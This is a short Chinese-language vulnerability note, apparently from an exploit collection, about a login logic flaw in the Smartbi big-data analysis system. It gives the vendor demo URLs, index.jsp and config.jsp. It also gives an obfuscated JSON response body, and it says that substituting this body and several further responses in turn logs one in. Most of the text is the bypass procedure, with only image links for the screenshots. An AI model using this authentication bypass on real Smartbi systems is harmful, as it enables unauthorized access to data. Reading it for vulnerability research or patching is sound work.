# Smartbi大数据分析系统登录页面存在逻辑缺陷漏洞

#  官方DEMO  
http://demo.smartbi.com.cn/smartbi/vision/index.jsp   
![img](images/clipboard.png)
http://demo.smartbi.com.cn/smartbi/vision/config.jsp  

![img](images/clipboard-1584693106666.png)

将响应包报文替换如下  
{"H~CxOm~":q,"H~*2KC":CH2~,"m2HECcO'":1}  

![img](images/clipboard-1584693121058.png)

依次替换几个报文后可成功登录系统 
 ![img](images/clipboard-1584693131304.png)